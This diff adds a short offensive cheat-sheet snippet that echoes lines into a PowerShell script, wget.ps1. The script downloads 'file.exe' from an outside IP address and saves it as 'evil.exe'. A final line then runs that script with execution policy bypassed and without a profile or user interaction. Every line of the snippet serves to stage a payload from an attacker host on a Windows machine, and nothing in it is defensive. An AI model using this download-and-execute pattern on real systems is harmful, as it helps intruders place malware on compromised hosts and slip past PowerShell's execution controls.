@@ -1,1 +1,9 @@
+// powershell wget
+echo $webclient = New-Object System.Net.Webclient >>wget.ps1
+echo $url = "http://1.2.3.4/file.exe" >> wget.ps1
+echo $file = "evil.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+echo $webclient = New-Object System.Net.Webclient >>wget.ps1
 
+// powershell execution
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
